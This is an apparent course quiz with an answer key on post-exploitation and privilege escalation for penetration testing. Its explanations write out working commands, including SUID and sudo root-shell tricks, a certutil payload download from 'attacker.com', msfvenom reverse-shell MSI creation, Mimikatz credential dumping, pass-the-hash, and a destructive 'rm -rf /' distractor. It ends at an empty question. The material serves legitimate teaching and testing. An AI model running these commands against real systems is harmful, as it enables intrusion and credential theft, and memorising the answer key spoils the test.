# Quiz: Module 12 — Post-Exploitation & Privilege Escalation

## Course: CIS-4333 Penetration Testing

**Certification Alignment:** CompTIA PenTest+ (PT0-002)

**Instructions:** Choose the single best answer for each question.

---

**Question 1**

A penetration tester has gained access to a Linux system as the `www-data` user. They run `find / -perm -4000 -type f 2>/dev/null` and identify that `/usr/bin/python3` has the SUID bit set. According to GTFOBins, which command would exploit this to obtain a root shell?

- A) `python3 -c 'import subprocess; subprocess.call("/bin/bash")'`
- B) `python3 -m http.server 8080`
- C) `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
- D) `sudo python3 /etc/shadow`

**Correct Answer:** C) `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

**Distractor Analysis:**

- *Why C is correct:* When python3 has the SUID bit set and is owned by root, executing it spawns the process with root's effective UID. The GTFOBins SUID technique uses `os.execl("/bin/sh", "sh", "-p")` to replace the current process with `/bin/sh`. The `-p` flag instructs bash/sh to preserve the effective UID rather than resetting it to the real UID. Without `-p`, the shell drops the SUID privilege. The result is a shell running with an effective UID of root while the real UID remains `www-data`.
- *Why A is incorrect:* `subprocess.call("/bin/bash")` spawns a new process, but without the `-p` flag, bash drops SUID privileges back to the real UID of `www-data`. This correctly invokes bash but fails to maintain the escalated effective UID. The `os.execl` with `-p` is the correct technique for SUID exploitation.
- *Why B is incorrect:* `python3 -m http.server 8080` starts a web server. While it would run as root due to the SUID bit, it does not provide an interactive shell and is not a privilege escalation technique. It is irrelevant to gaining root access.
- *Why D is incorrect:* `sudo python3 /etc/shadow` would require the user to have sudo rights to run python3, and reading `/etc/shadow` as an argument does not execute python3 in a way that spawns a shell. This command also mixes SUID exploitation with sudo concepts incorrectly. SUID exploitation does not involve `sudo`.

---

**Question 2**

A penetration tester discovers the following Windows service entry using `wmic service get name,pathname`:

```
VulnerableSvc    C:\Program Files\Vulnerable Corp\Service\app.exe
```

The path is not enclosed in quotes. The tester confirms that `C:\` is writable by the current user. Which file path would Windows try to execute first when starting this service?

- A) `C:\Program Files\Vulnerable Corp\Service\app.exe`
- B) `C:\Program Files\Vulnerable.exe`
- C) `C:\Program.exe`
- D) `C:\Windows\System32\app.exe`

**Correct Answer:** C) `C:\Program.exe`

**Distractor Analysis:**

- *Why C is correct:* When a Windows service path is not quoted and contains spaces, Windows attempts to find an executable by splitting at each space and appending `.exe`. The parsing order starts from the beginning of the path. The first attempt is `C:\Program.exe` (treating "Program" as the executable name and "Files\Vulnerable Corp\Service\app.exe" as arguments). If `C:\Program.exe` does not exist, Windows tries `C:\Program Files\Vulnerable.exe`. If that fails, it tries `C:\Program Files\Vulnerable Corp\Service\app.exe`. Placing a malicious executable at `C:\Program.exe` causes it to execute first, as the service user (often SYSTEM).
- *Why A is incorrect:* `C:\Program Files\Vulnerable Corp\Service\app.exe` is the last path Windows tries — only when all shorter space-split attempts fail. If an attacker can place a malicious file at any of the earlier locations, `app.exe` is never reached.
- *Why B is incorrect:* `C:\Program Files\Vulnerable.exe` is the second path Windows tries, not the first. The parsing begins from the leftmost space boundary. While this is also an exploitable location, it is not the first in the search order.
- *Why D is incorrect:* `C:\Windows\System32\app.exe` is not part of the unquoted service path search logic at all. Windows does not search its System32 directory as part of unquoted path resolution. The search is strictly based on space-splitting the exact path string.

---

**Question 3**

A tester has administrator privileges on a Windows system and wants to dump NTLM hashes of all local user accounts. Which Mimikatz command targets the SAM database?

- A) `sekurlsa::logonpasswords`
- B) `lsadump::sam`
- C) `kerberos::list`
- D) `sekurlsa::tickets`

**Correct Answer:** B) `lsadump::sam`

**Distractor Analysis:**

- *Why B is correct:* `lsadump::sam` extracts NTLM password hashes for local accounts from the Security Account Manager (SAM) database. The SAM is a registry hive that stores local account credentials. Mimikatz uses the SAM dump to retrieve the hashed passwords of all local accounts, including the local Administrator account. This is the authoritative source for local account hashes.
- *Why A is incorrect:* `sekurlsa::logonpasswords` extracts credential material from LSASS (Local Security Authority Subsystem Service) process memory. It returns credentials of users who have active or recent sessions — including domain accounts. While it can return NTLM hashes and sometimes plaintext passwords, it targets interactive session credentials in memory, not the SAM database directly.
- *Why C is incorrect:* `kerberos::list` lists Kerberos tickets currently held in the current session. It is used for pass-the-ticket operations, not credential hash dumping. It does not interact with the SAM database.
- *Why D is incorrect:* `sekurlsa::tickets` exports Kerberos tickets from LSASS memory for pass-the-ticket attacks. Like `kerberos::list`, it targets ticket-based authentication material, not NTLM hashes from the SAM database.

---

**Question 4**

A penetration tester has obtained the NTLM hash `aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C` for the local Administrator account. They want to use this hash to authenticate to another Windows host on the same network without knowing the plaintext password. Which technique and tool should they use?

- A) Pass-the-ticket using `kerberos::ptt` in Mimikatz to inject the hash as a Kerberos ticket
- B) Pass-the-hash using Impacket's `psexec.py` with the `-hashes` flag to authenticate via SMB
- C) Password spraying using Hydra to test the hash against all accounts on the target
- D) Golden Ticket attack using the NTLM hash as the KRBTGT account credential

**Correct Answer:** B) Pass-the-hash using Impacket's `psexec.py` with the `-hashes` flag to authenticate via SMB

**Distractor Analysis:**

- *Why B is correct:* Pass-the-hash exploits NTLM authentication, which is a challenge-response protocol that uses the NTLM hash directly as the authentication secret. The plaintext password is never sent — only a response derived from the hash. Impacket's `psexec.py` supports the `-hashes LM:NTLM` flag to provide hash-based authentication via SMB. The format `aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C` is `LM:NTLM` (the LM hash shown is the empty-password LM hash, used as a placeholder on modern systems). This authenticates as local Administrator without cracking the hash.
- *Why A is incorrect:* Pass-the-ticket uses Kerberos tickets, not NTLM hashes. `kerberos::ptt` injects Kerberos `.kirbi` ticket files — not hashes. NTLM hashes and Kerberos tickets are from completely different authentication protocols. You cannot inject an NTLM hash as a Kerberos ticket.
- *Why C is incorrect:* Password spraying tests username-password pairs against live authentication. It requires a plaintext password or wordlist, not a hash. Hydra's `-p` flag takes plaintext passwords. You cannot pass a hash to Hydra for spraying — that would require hash cracking first.
- *Why D is incorrect:* A Golden Ticket attack requires the NTLM hash of the domain `KRBTGT` account specifically — a highly privileged domain account used to sign all Kerberos tickets. An ordinary local Administrator NTLM hash cannot be used to forge domain-wide Kerberos tickets. A Silver Ticket uses a service account hash for a specific service, but also requires knowledge of specific Kerberos principals.

---

**Question 5**

A Linux penetration tester checks `/etc/crontab` and finds the following entry:

```
* * * * * root /opt/scripts/cleanup.sh
```

They check permissions on the script and find it is world-writable (`-rwxrwxrwx`). Which command appended to the script would give the tester a persistent root shell?

- A) `chmod 777 /etc/shadow`
- B) `chmod u+s /bin/bash`
- C) `echo "rm -rf /" >> /opt/scripts/cleanup.sh`
- D) `sudo /opt/scripts/cleanup.sh`

**Correct Answer:** B) `chmod u+s /bin/bash`

**Distractor Analysis:**

- *Why B is correct:* The cron job runs as root every minute. Appending `chmod u+s /bin/bash` to the world-writable script causes root to add the SUID bit to `/bin/bash` on the next cron execution. Once the SUID bit is set on bash, any user can run `bash -p` to get a root shell. This is a persistent privilege escalation — the SUID bit remains set even after the cron job completes. This technique demonstrates the real-world risk of leaving world-writable scripts in root-owned cron jobs.
- *Why A is incorrect:* Making `/etc/shadow` world-readable (`chmod 777`) allows any user to read password hashes, which is a credential exposure. However, it does not directly provide a root shell and is a secondary impact. The question asks for a command that gives a root shell, not credential access. `chmod u+s /bin/bash` is more direct.
- *Why C is incorrect:* `echo "rm -rf /" >> /opt/scripts/cleanup.sh` would destroy the filesystem when root executes the script — this is a destructive attack, not a privilege escalation technique. During a penetration test, destroying data is never acceptable. This answer represents dangerous, out-of-scope behavior that no professional tester would perform.
- *Why D is incorrect:* `sudo /opt/scripts/cleanup.sh` would only work if the current user has sudo rights to run that script, which is not implied by the scenario. The vulnerability here is the world-writable file run by root cron — exploiting it does not require or involve sudo.

---

**Question 6**

A Windows penetration tester runs `whoami /priv` on a compromised IIS application pool account and sees `SeImpersonatePrivilege: Enabled`. Which tool exploits this specific privilege to escalate to SYSTEM on modern Windows Server systems?

- A) Mimikatz's `sekurlsa::logonpasswords`
- B) WinPEAS with the `--all` flag
- C) PrintSpoofer
- D) Reaver

**Correct Answer:** C) PrintSpoofer

**Distractor Analysis:**

- *Why C is correct:* `SeImpersonatePrivilege` allows a process to impersonate the security context of another user. PrintSpoofer exploits this privilege by abusing the Windows Print Spooler service to force a SYSTEM token to connect back to a named pipe that the attacker controls. The attacker then impersonates the SYSTEM token, escalating from a low-privilege service account to NT AUTHORITY\SYSTEM. PrintSpoofer is the modern tool for this attack on Windows Server 2019 and Windows 10 — superseding older Potato techniques that no longer work on current systems.
- *Why A is incorrect:* `sekurlsa::logonpasswords` dumps credentials from LSASS memory. It is a credential extraction tool, not a privilege escalation tool. It requires administrator privileges to run — it cannot be used to escalate from a low-privilege service account to SYSTEM.
- *Why B is incorrect:* WinPEAS is an enumeration tool that identifies privilege escalation vectors. It does not perform exploitation. Running it with any flag produces information about vulnerabilities but does not escalate privileges. A tester uses WinPEAS to discover that `SeImpersonatePrivilege` is enabled, then uses PrintSpoofer to exploit it.
- *Why D is incorrect:* Reaver is a wireless penetration testing tool that exploits WPS PIN vulnerabilities on Wi-Fi access points. It has no relevance to Windows privilege escalation or token impersonation.

---

**Question 7**

What does the `sekurlsa::logonpasswords` command in Mimikatz specifically extract, and what Windows security feature can prevent it from succeeding on modern systems?

- A) It extracts SAM database hashes, and BitLocker encryption prevents it from running.
- B) It extracts credential material from LSASS process memory, and Windows Credential Guard prevents it by isolating LSASS in a virtualization-based security enclave.
- C) It extracts browser saved passwords, and Windows Defender prevents it by blocking Mimikatz execution.
- D) It extracts Kerberos tickets from memory, and Kerberos pre-authentication prevents ticket theft.

**Correct Answer:** B) It extracts credential material from LSASS process memory, and Windows Credential Guard prevents it by isolating LSASS in a virtualization-based security enclave.

**Distractor Analysis:**

- *Why B is correct:* `sekurlsa::logonpasswords` accesses the LSASS process memory to extract credentials of users with active or recent interactive sessions — including NTLM hashes and, on older systems, WDigest plaintext passwords. Windows Credential Guard, introduced in Windows 10 and Server 2016, uses Virtualization-Based Security (VBS) to run LSASS in an isolated environment. When Credential Guard is enabled, the credentials are stored in a trusted execution environment that standard processes — including Mimikatz — cannot access, rendering `sekurlsa::logonpasswords` ineffective.
- *Why A is incorrect:* `lsadump::sam` extracts SAM database hashes, not `sekurlsa::logonpasswords`. BitLocker encrypts the disk at rest — it protects against offline attacks but has no effect on Mimikatz executing on a running, authenticated system. A logged-in user with administrator rights can run Mimikatz regardless of BitLocker.
- *Why C is incorrect:* Mimikatz `sekurlsa::logonpasswords` targets LSASS memory, not browser credential stores. Browser credential extraction is performed by separate tools. Windows Defender may flag and block Mimikatz binaries, but the mitigation relevant to `sekurlsa::logonpasswords` effectiveness is Credential Guard — not antivirus detection.
- *Why D is incorrect:* `sekurlsa::tickets` (not `sekurlsa::logonpasswords`) extracts Kerberos tickets. Kerberos pre-authentication is a protocol feature that prevents offline AS-REP roasting against accounts that require pre-authentication — it does not protect LSASS memory from Mimikatz. These are separate concerns.

---

**Question 8**

A tester discovers that both `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` and `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` are set to `0x1`. Which attack does this configuration enable?

- A) The tester can modify the service binary for any Windows service without administrator rights.
- B) The tester can install a malicious `.msi` package as SYSTEM privileges, even from a standard user account.
- C) The tester can add a new local administrator account by modifying the SAM database directly.
- D) The tester can enable the Guest account and log in with elevated privileges.

**Correct Answer:** B) The tester can install a malicious `.msi` package as SYSTEM privileges, even from a standard user account.

**Distractor Analysis:**

- *Why B is correct:* When `AlwaysInstallElevated` is set to 1 in both HKCU and HKLM (both keys must be set), any user can install Windows Installer packages (`.msi` files) with elevated SYSTEM privileges regardless of their actual permission level. A tester generates a malicious `.msi` with msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o malicious.msi`, then installs it: `msiexec /quiet /qn /i malicious.msi`. The reverse shell executes as SYSTEM.
- *Why A is incorrect:* Service binary modification is a separate vulnerability related to weak ACLs on service binary files. The `AlwaysInstallElevated` policy is specific to Windows Installer (MSI) packages and does not affect service binary permissions.
- *Why C is incorrect:* SAM database modification requires SYSTEM privileges — it cannot be performed by a standard user regardless of the `AlwaysInstallElevated` setting. Adding local administrator accounts through direct SAM manipulation is not possible without first obtaining the elevated access that `AlwaysInstallElevated` provides.
- *Why D is incorrect:* The Guest account is enabled through User Account settings, not the Windows Installer policy. `AlwaysInstallElevated` has no effect on account management or the Guest account status. These are completely unrelated registry settings.

---

**Question 9**

During post-exploitation on a Linux server, a tester finds the file `/home/deploy/.ssh/id_rsa` with permissions `-rw-------` and content beginning with `-----BEGIN RSA PRIVATE KEY-----`. Why is this file significant to the engagement?

- A) It contains the MD5 hash of the deploy user's password, which can be cracked offline.
- B) It is an unencrypted RSA private key that can authenticate the tester as the `deploy` user to any SSH server where the corresponding public key is authorized.
- C) It is a TLS certificate file that enables man-in-the-middle interception of HTTPS traffic.
- D) It contains NTLM hashes that can be used for pass-the-hash authentication to Windows systems.

**Correct Answer:** B) It is an unencrypted RSA private key that can authenticate the tester as the `deploy` user to any SSH server where the corresponding public key is authorized.

**Distractor Analysis:**

- *Why B is correct:* SSH private key files in `~/.ssh/id_rsa` (or `id_ecdsa`, `id_ed25519`) are the authentication credentials for public-key SSH authentication. If the private key has no passphrase (indicated by the unencrypted header `-----BEGIN RSA PRIVATE KEY-----` rather than `-----BEGIN ENCRYPTED PRIVATE KEY-----`), the tester can use it directly to authenticate as the `deploy` user: `ssh -i id_rsa deploy@<target_ip>`. If this key is authorized on other internal servers (`authorized_keys` file), it enables lateral movement without any additional credential cracking.
- *Why A is incorrect:* SSH private keys are not password hash files. They are asymmetric cryptographic key pairs used for public-key authentication. The file does not contain an MD5 hash of the user's password and cannot be used for offline password cracking.
- *Why C is incorrect:* TLS certificates and SSH private keys serve different purposes and have different file formats. TLS certificates are typically in PEM format with headers like `-----BEGIN CERTIFICATE-----`. While the file format is similar, an SSH `id_rsa` private key is not usable for TLS/HTTPS interception.
- *Why D is incorrect:* NTLM hashes are a Windows authentication mechanism stored in the SAM database or LSASS memory. They have no relationship to SSH private keys on Linux systems. An SSH private key cannot be converted to or used as an NTLM hash.

---

**Question 10**

A penetration tester uses the LOLBAS technique with `certutil.exe` on a compromised Windows host. What is the purpose of this specific living-off-the-land technique?

- A) `certutil.exe` enumerates all certificates in the Windows certificate store to identify expired or self-signed certificates.
- B) `certutil.exe` can download files from attacker-controlled URLs and decode base64-encoded payloads, allowing file transfer and payload staging without introducing non-native tools.
- C) `certutil.exe` modifies Windows Defender exclusion lists to prevent detection of malware dropped on disk.
- D) `certutil.exe` decrypts EFS-encrypted files on the compromised system, exposing sensitive documents.

**Correct Answer:** B) `certutil.exe` can download files from attacker-controlled URLs and decode base64-encoded payloads, allowing file transfer and payload staging without introducing non-native tools.

**Distractor Analysis:**

- *Why B is correct:* `certutil.exe` is a legitimate Windows certificate management utility that is signed by Microsoft. The LOLBAS project documents that it can be abused in two key ways: downloading files via HTTP/HTTPS (`certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe`) and decoding base64-encoded content (`certutil.exe -decode encoded.b64 payload.exe`). Because `certutil.exe` is a signed Microsoft binary expected to run in enterprise environments, security tools may not alert on its execution even when it is being used to download malicious payloads.
- *Why A is incorrect:* While `certutil.exe` can legitimately enumerate certificate store contents, that is its intended use for IT administrators — not a LOLBAS abuse technique. The exam context for LOLBAS is about abusing trusted binaries for attacker purposes, not their legitimate administrative functions.
- *Why C is incorrect:* Modifying Windows Defender exclusions requires specific administrative API calls or PowerShell commands — `certutil.exe` does not interact with Windows Defender configuration. Defender exclusion modification is a different defense evasion technique entirely.
- *Why D is incorrect:* EFS (Encrypting File System) decryption through `certutil.exe` is not a standard LOLBAS technique. EFS decryption typically requires the original user's certificate and private key, accessed through Windows certificate management. `certutil.exe` does not decrypt arbitrary EFS files on behalf of an attacker.

---

---

**Question 11**

A tester on a compromised Linux host runs `cat /etc/crontab` and finds: `* * * * * root /tmp/cleanup.sh`. The file `/tmp/cleanup.sh` is world-writable. What privilege escalation path does this create?

- A) The tester can modify cleanup.sh to execute commands as root because cron runs it every minute with root privileges and the script is writable by any user
- B) The tester can only read the script contents since cron jobs execute in a sandboxed environment
- C) This is not exploitable because `/tmp` is mounted with `noexec` on all modern Linux distributions
- D) The tester must wait for the next reboot to trigger the cron job with elevated privileges

**Correct Answer:** A) The tester can modify cleanup.sh to execute commands as root because cron runs it every minute with root privileges and the script is writable by any user

**Distractor Analysis:**

- *Why A is correct:* When a cron job runs as root and executes a world-writable script, any user on the system can append to or replace the script content with arbitrary commands. Those commands will execute as root within 60 seconds (one cron cycle). Adding a reverse shell one-liner to the script provides immediate root access. This is a direct privilege escalation path documented in both manual and automated enumeration tools like LinPEAS.
- *Why B is incorrect:* Cron jobs do not run in a sandbox. They execute with the full privileges of the specified user (root in this case) and with full access to the file system. There is no isolation between cron execution and the rest of the system.
- *Why C is incorrect:* While some systems mount `/tmp` with `noexec`, this is not universal. Even where `noexec` is set, a bash script can still be executed via the shell interpreter (`bash /tmp/cleanup.sh`) rather than direct execution. The script content can be modified regardless of `noexec`.
- *Why D is incorrect:* Cron runs continuously while the system is powered on. The `* * * * *` schedule means the job executes every minute — no reboot is required. The tester only needs to wait up to 60 seconds after modifying the script.

---

**Question 12**

A Windows tester runs `accesschk.exe -uwcqv "Everyone" *` and discovers that the `Everyone` group has `SERVICE_CHANGE_CONFIG` permission on a service named `WeakSvc`. What exploitation technique is enabled by this finding?

- A) The tester can stop and restart the service but cannot modify its configuration
- B) The tester can use `sc config WeakSvc binpath= "cmd /c net localgroup administrators attacker /add"` to change the service binary path to an attacker-controlled command, then restart the service to execute it as SYSTEM
- C) `SERVICE_CHANGE_CONFIG` only allows changing the service description — it cannot modify the binary path
- D) This permission enables DLL hijacking but not direct binary path modification

**Correct Answer:** B) The tester can use `sc config WeakSvc binpath= "cmd /c net localgroup administrators attacker /add"` to change the service binary path to an attacker-controlled command, then restart the service to execute it as SYSTEM

**Distractor Analysis:**

- *Why B is correct:* `SERVICE_CHANGE_CONFIG` allows modification of all service configuration parameters including `binpath`. By replacing the binary path with a command that adds a user to the local administrators group (or drops a shell), the tester causes Windows to execute that command under the service account when the service starts. If the service runs as SYSTEM (common), this grants immediate administrative access.
- *Why A is incorrect:* `SERVICE_CHANGE_CONFIG` grants configuration modification rights, which includes the binary path — it is not limited to start/stop operations. Stop and restart permissions are controlled by separate access rights (`SERVICE_STOP`, `SERVICE_START`).
- *Why C is incorrect:* `SERVICE_CHANGE_CONFIG` is a broad permission that allows modifying all configuration fields including binary path, start type, account, and description. It is not limited to descriptions only.
- *Why D is incorrect:* DLL hijacking exploits the DLL search order when an application loads DLLs. `SERVICE_CHANGE_CONFIG` exploitation directly replaces the binary path — it is not a DLL hijacking technique.

---

**Question 13**

During a Windows privilege escalation assessment, a tester discovers the registry keys `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` and `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` are both set to `1`. What attack does this enable?

- A) The tester can install any MSI package with SYSTEM privileges, regardless of the current user's privilege level — typically exploited by generating a malicious MSI with msfvenom and installing it
- B) Both keys set to `1` indicates the system is fully patched and MSI installations are blocked
- C) The tester can only elevate privileges for signed MSI packages from trusted publishers
- D) `AlwaysInstallElevated` only affects installations run from the command line, not double-click installations

**Correct Answer:** A) The tester can install any MSI package with SYSTEM privileges, regardless of the current user's privilege level — typically exploited by generating a malicious MSI with msfvenom and installing it

**Distractor Analysis:**

- *Why A is correct:* When both HKLM and HKCU keys are set to 1, Windows allows any user to install MSI packages with elevated (SYSTEM) privileges. This policy is intended to allow standard users to install software but creates a critical privilege escalation path. The attack: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f msi -o shell.msi` then `msiexec /quiet /qn /i shell.msi`. Both keys must be set to 1 — if only one is set, the escalation does not work.
- *Why B is incorrect:* Both keys set to 1 enables the privilege escalation — it does not indicate patching or blocking. This is a deliberate but dangerous policy configuration.
- *Why C is incorrect:* `AlwaysInstallElevated` does not restrict escalation to signed packages. Any MSI — including attacker-generated ones — runs with SYSTEM privileges when this policy is active.
- *Why D is incorrect:* `AlwaysInstallElevated` applies to all MSI installations regardless of how they are initiated — double-click, command line, or scripted. The escalation works through any MSI execution path.

---

**Question 14**

A tester with a low-privilege shell on a Windows host runs `systeminfo` and identifies the OS as Windows Server 2016 with no patches applied since 2019. Which next step best identifies exploitable local privilege escalation paths?

- A) Run `whoami /priv` and then use Metasploit's `local_exploit_suggester` against the current session to identify applicable kernel and local privilege escalation exploits
- B) Run `netstat -an` to identify active network connections, then exploit the most recently established connection
- C) Run `dir C:\` to enumerate all files and immediately look for sensitive documents
- D) Run `ipconfig /all` to identify network interfaces, then scan adjacent subnets for lateral movement targets

**Correct Answer:** A) Run `whoami /priv` and then use Metasploit's `local_exploit_suggester` against the current session to identify applicable kernel and local privilege escalation exploits

**Distractor Analysis:**

- *Why A is correct:* `whoami /priv` reveals currently enabled and disabled privileges that can be abused (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege). An unpatched 2016 server is potentially vulnerable to multiple kernel-level CVEs. The `local_exploit_suggester` cross-references the OS version and patch level against Metasploit's exploit database to identify specific applicable modules. This is the systematic approach to local privilege escalation enumeration.
- *Why B is incorrect:* `netstat -an` reveals network connections and is useful for lateral movement planning — it does not directly identify local privilege escalation paths. Active connections cannot be "exploited" as a local escalation technique.
- *Why C is incorrect:* Directory enumeration for sensitive documents is a data collection activity, not privilege escalation. It is performed after escalating privileges, not as a method to achieve escalation.
- *Why D is incorrect:* Network interface enumeration and lateral movement are post-privilege-escalation activities. Before moving laterally, the tester should first maximize privilege on the current host to maximize the value of further actions.

---

**Question 15**

A Linux tester with a shell as `www-data` runs `sudo -l` and sees: `(root) NOPASSWD: /usr/bin/vim`. According to GTFOBins, how can this be exploited to spawn a root shell?

- A) `sudo vim -c '!sh'` — vim's command mode can execute shell commands; running it with sudo grants the shell root privileges
- B) `sudo vim /etc/shadow` — editing the shadow file directly resets the root password
- C) `sudo vim --root-shell /bin/bash` — vim has a built-in privilege escalation flag
- D) This cannot be exploited because vim only edits files and cannot spawn processes

**Correct Answer:** A) `sudo vim -c '!sh'` — vim's command mode can execute shell commands; running it with sudo grants the shell root privileges

**Distractor Analysis:**

- *Why A is correct:* Vim's command mode (entered with `:`) can execute shell commands via `!command`. Running `sudo vim -c '!sh'` starts vim with root privileges (via sudo) and immediately executes `!sh` through vim's command mode, spawning a root shell. GTFOBins documents this and dozens of similar editor-based escalation paths. The key insight is that any program that can invoke a shell inherits the permissions it was launched with.
- *Why B is incorrect:* While editing `/etc/shadow` with root-privileged vim could modify password hashes, this is not the standard exploitation path for a GTFOBins sudo vim finding. It would require knowledge of password hash generation and is more complex than simply spawning a shell.
- *Why C is incorrect:* `--root-shell` is not a valid vim flag. Vim does not have built-in privilege escalation options.
- *Why D is incorrect:* Vim can absolutely spawn processes through its command mode (`:!command`) and shell (`:shell`). The ability to execute shell commands is a core vim feature that creates the escalation path when vim is run with elevated privileges.

---

**Question 16**

A tester discovers that a running Windows service binary path points to `C:\Program Files\Custom App\service.exe` without quotation marks around the path. The tester confirms write access to `C:\`. What is the exploitation sequence?

- A) Create `C:\Program.exe` containing a malicious payload; when the service starts or restarts, Windows executes `C:\Program.exe` before reaching the legitimate binary because it parses the unquoted path left-to-right at each space
- B) Replace `C:\Program Files\Custom App\service.exe` directly with a malicious binary
- C) Create a DLL named `service.dll` in `C:\Program Files\Custom App\` to intercept the service's DLL loading
- D) Modify the service's registry key at `HKLM\SYSTEM\CurrentControlSet\Services\CustomApp\ImagePath` using regedit

**Correct Answer:** A) Create `C:\Program.exe` containing a malicious payload; when the service starts or restarts, Windows executes `C:\Program.exe` before reaching the legitimate binary because it parses the unquoted path left-to-right at each space

**Distractor Analysis:**

- *Why A is correct:* Windows parses unquoted service paths by attempting to execute each space-delimited prefix as a potential executable. For `C:\Program Files\Custom App\service.exe`, Windows tries: `C:\Program.exe`, then `C:\Program Files\Custom.exe`, then `C:\Program Files\Custom App\service.exe`. Placing a malicious `Program.exe` in `C:\` (if writable) causes Windows to execute it instead of the legitimate service binary. This executes with the service account's privileges.
- *Why B is incorrect:* Directly replacing the service binary requires write access to `C:\Program Files\Custom App\` — not just `C:\`. If the tester had write access to the service directory, a different exploitation approach would apply. The unquoted path technique only requires write access to a parent directory.
- *Why C is incorrect:* DLL hijacking involves the DLL search order, not the service binary path parsing. It requires the service binary to load DLLs without full paths. This is a separate technique from unquoted service paths.
- *Why D is incorrect:* Modifying the registry `ImagePath` directly would require `SERVICE_CHANGE_CONFIG` permission on the service object, which is a different privilege escalation technique (weak service permissions). Write access to `C:\` does not grant registry key write access.

---

**Question 17**

After dumping NTLM hashes from LSASS on a Windows host with Mimikatz, a tester attempts to use the Administrator hash to authenticate to other Windows hosts on the network using CrackMapExec. Three out of eight hosts respond with `[+]`. The other five respond with `[-]`. What does the `[-]` response on five hosts most likely indicate?

- A) The five hosts are offline and not responding to network requests
- B) The five hosts have different local administrator passwords, meaning the hashes do not match — this is good security practice (Local Administrator Password Solution or unique passwords per system)
- C) The five hosts are running Linux and NTLM authentication is not supported
- D) CrackMapExec requires Domain Administrator hashes — local administrator hashes always fail

**Correct Answer:** B) The five hosts have different local administrator passwords, meaning the hashes do not match — this is good security practice (Local Administrator Password Solution or unique passwords per system)

**Distractor Analysis:**

- *Why B is correct:* A `[-]` response in CrackMapExec indicates authentication failure — the hash did not match. Five hosts rejecting the same administrator hash while three accepted it indicates those five systems have unique local administrator passwords. This is the expected result when Microsoft's Local Administrator Password Solution (LAPS) or a similar policy is enforced. The three hosts that accepted the hash reveal a password reuse vulnerability; the five that rejected it demonstrate proper password management.
- *Why A is incorrect:* CrackMapExec distinguishes between unreachable hosts (connection errors, timeouts) and authentication failures. A `[-]` specifically indicates a response was received but authentication was denied — the host is online.
- *Why C is incorrect:* The scenario describes Windows hosts on an internal network. Linux systems do not expose SMB NTLM authentication endpoints that CrackMapExec tests against in its default SMB mode.
- *Why D is incorrect:* CrackMapExec with `--local-auth` specifically uses local account authentication, bypassing domain controllers. Local administrator hashes absolutely work for local authentication — the three `[+]` responses prove this.

---

**Question 18**

A tester finds that a Linux system has `/etc/passwd` writable by the current user (a significant misconfiguration). What exploitation technique directly leverages this to gain root access?

- A) Delete the root entry from `/etc/passwd` to trigger a system error that grants emergency root access
- B) Add a new entry to `/etc/passwd` with UID 0 and a known password hash: `attacker:$1$salt$hash:0:0:root:/root:/bin/bash` — then authenticate as `attacker` to gain a root shell
- C) Replace the root username with the current user's name to inherit root privileges
- D) Writable `/etc/passwd` only allows reading the file — write operations require `sudo`

**Correct Answer:** B) Add a new entry to `/etc/passwd` with UID 0 and a known password hash: `attacker:$1$salt$hash:0:0:root:/root:/bin/bash` — then authenticate as `attacker` to gain a root shell

**Distractor Analysis:**

- *Why B is correct:* On traditional Unix systems, `/etc/passwd` can store password hashes directly (the 'x' in modern systems means the hash is in `/etc/shadow`). If `/etc/passwd` is writable, the tester can add a new user with UID 0 (root-equivalent) and a known password hash. The pre-generated hash for a known password (created with `openssl passwd -1 "password"`) allows the tester to then `su attacker` with the known password, obtaining a root shell.
- *Why A is incorrect:* Deleting the root entry from `/etc/passwd` would break root authentication and potentially destabilize the system — it does not grant access and is a destructive action that violates professional engagement standards.
- *Why C is incorrect:* The privilege level is determined by the UID (0 = root), not by the username string. Changing the root username does not change the current user's UID or grant them root privileges.
- *Why D is incorrect:* The entire premise of this question is that `/etc/passwd` is writable by the current user. If write access exists, write operations can be performed without sudo. The misconfiguration is precisely that write access exists when it should not.

---

**Question 19**

During a Windows assessment, a tester identifies that the `SeImpersonatePrivilege` token privilege is enabled for the current session (running as `NT AUTHORITY\NETWORK SERVICE`). Which class of attack does this enable?

- A) Kerberoasting — the privilege allows requesting service tickets for all SPNs in the domain
- B) Token impersonation attacks such as PrintSpoofer or Potato exploits — SeImpersonatePrivilege allows the process to impersonate a client after authentication, which these exploits leverage to impersonate SYSTEM-level tokens
- C) Pass-the-hash — the privilege provides access to NTLM hashes stored in LSASS memory
- D) DLL injection — the privilege allows loading arbitrary DLLs into privileged processes

**Correct Answer:** B) Token impersonation attacks such as PrintSpoofer or Potato exploits — SeImpersonatePrivilege allows the process to impersonate a client after authentication, which these exploits leverage to impersonate SYSTEM-level tokens

**Distractor Analysis:**

- *Why B is correct:* `SeImpersonatePrivilege` is commonly held by service accounts (IIS, SQL Server, NETWORK SERVICE) and allows a process to impersonate tokens from clients that connect to it. Potato exploits (JuicyPotato, RoguePotato, SweetPotato) and PrintSpoofer abuse this by coercing SYSTEM to authenticate to the attacker's named pipe/listener, capturing the SYSTEM token, and using `SeImpersonatePrivilege` to impersonate it — resulting in code execution as SYSTEM.
- *Why A is incorrect:* Kerberoasting requests service tickets for accounts with SPNs, requiring only a valid domain user account. It does not require `SeImpersonatePrivilege` and targets domain authentication, not local token impersonation.
- *Why C is incorrect:* Pass-the-hash uses captured NTLM hashes for authentication. Accessing LSASS requires `SeDebugPrivilege` — not `SeImpersonatePrivilege`. These are different token privileges for different attack techniques.
- *Why D is incorrect:* DLL injection requires different capabilities including process memory write access and specific API calls. `SeImpersonatePrivilege` is specifically for token impersonation after a client authenticates, not for DLL loading into other processes.

---

**Question 20**

